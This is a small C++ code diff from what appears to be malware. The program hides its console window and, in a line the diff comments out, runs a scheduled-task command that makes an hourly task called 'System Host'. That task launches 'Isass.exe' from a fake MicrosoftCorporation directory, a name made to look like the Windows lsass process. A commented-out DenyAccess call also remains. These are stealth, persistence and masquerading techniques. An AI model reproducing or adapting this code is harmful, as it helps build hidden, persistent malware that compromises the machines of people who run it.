@@ -24,10 +24,10 @@ Utils utils;
 
 int main(int argc, char* argv[])
 {
-	//utils.HideConsole();
+	utils.HideConsole();
 	//utils.DenyAccess();
 
-	system("powershell.exe SCHTASKS.exe /Create /SC HOURLY /TN \"System Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
+	//system("powershell.exe SCHTASKS.exe /Create /SC HOURLY /TN \"System Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
 
 	std::cin.get();
     return 0;
